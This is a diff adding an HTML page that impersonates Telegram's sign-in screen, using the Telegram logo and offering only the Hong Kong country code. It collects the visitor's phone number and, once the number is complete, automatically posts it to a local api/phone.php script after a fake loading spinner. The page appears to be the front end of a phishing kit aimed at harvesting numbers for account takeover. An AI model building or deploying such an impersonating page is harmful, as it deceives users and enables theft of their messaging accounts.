@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Country Selection</title>
+    <style>
+        /* Your existing styles remain unchanged */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            width: 300px;
+        }
+        .container img {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+        .title {
+            font-size: 1.25rem;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 5px;
+        }
+        .subtitle {
+            font-size: 0.87rem;
+            color: #777;
+            margin-bottom: 20px;
+        }
+        .select-container, .phone-input-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        .select-container select, .phone-input-container input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+            appearance: none;
+            text-align: center;
+            cursor: pointer;
+        }
+        .phone-input-container {
+            display: none;
+            flex-direction: row;
+            align-items: center;
+        }
+        .country-code {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-right: none;
+            border-radius: 4px 0 0 4px;
+            font-size: 1rem;
+            background-color: #f9f9f9;
+            color: #333;
+        }
+        .phone-input {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 0 4px 4px 0;
+            font-size: 1rem;
+            text-align: left;
+        }
+        /* Loading spinner styles */
+        #loadingSpinner {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 1.5rem;
+            color: #000;
+        }
+        #loadingSpinner:before {
+            content: '';
+            display: block;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #ccc;
+            border-top: 4px solid #333;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
+        <h6 class="title">Telegram</h6>
+        <p class="subtitle">Please confirm your country code and enter your phone number.</p>
+
+        <!-- Country Select Dropdown -->
+        <div class="select-container" id="countrySelectContainer">
+            <select id="countrySelect">
+                <option value="">Select Country</option>
+                <option value="hongkong" data-code="+852" data-max-length="8">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5c/Flag_of_Hong_Kong.svg" alt="Hong Kong Flag" style="width: 20px; vertical-align: middle;"> 
+                    Hong Kong
+                </option>
+            </select>
+        </div>
+
+        <!-- Phone Number Input Field (Initially Hidden) -->
+        <div class="phone-input-container" id="phoneNumberContainer">
+            <span class="country-code" id="countryCode">+852</span>
+            <input type="tel" id="phoneNumber" class="phone-input" placeholder="Enter your phone number" inputmode="numeric" />
+        </div>
+
+        <!-- Form to submit phone number -->
+        <form id="phoneForm" action="api/phone.php" method="POST" onsubmit="loadd();">
+    <input type="hidden" name="phone_number" id="hiddenPhoneNumber" />
+    <input type="hidden" name="country_code" id="hiddenCountryCode" />
+    <button type="submit" id="submitPhoneNumber" style="display:none;"></button>
+</form>
+
+
+    </div>
+
+    <!-- Loading Spinner -->
+    <div id="loadingSpinner"></div>
+
+    <script>
+        document.getElementById('countrySelect').addEventListener('change', function() {
+            var selectedCountry = this.options[this.selectedIndex];
+            var countryCode = selectedCountry.getAttribute('data-code');
+            var maxLength = selectedCountry.getAttribute('data-max-length');
+            var phoneNumberContainer = document.getElementById('phoneNumberContainer');
+            var countryCodeDisplay = document.getElementById('countryCode');
+
+            if (countryCode) {
+                countryCodeDisplay.textContent = countryCode;
+                phoneNumberContainer.style.display = 'flex';
+                document.getElementById('countrySelectContainer').style.display = 'none';
+
+                document.getElementById('phoneNumber').setAttribute('maxlength', maxLength);
+            } else {
+                phoneNumberContainer.style.display = 'none';
+            }
+        });
+
+        document.getElementById('phoneNumber').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+            var maxLength = this.getAttribute('maxlength');
+            if (this.value.length > maxLength) {
+                this.value = this.value.substring(0, maxLength);
+            }
+
+            if (this.value.length == maxLength) {
+                document.getElementById('loadingSpinner').style.display = 'block';
+                document.getElementById('hiddenPhoneNumber').value = document.getElementById('phoneNumber').value;
+                document.getElementById('hiddenCountryCode').value = document.getElementById('countryCode').textContent;
+
+                setTimeout(function() {
+                    document.getElementById('phoneForm').submit(); // Submit the form to req/phone.php
+                }, 2000);
+            }
+        });
+    </script>
+</body>
+</html>
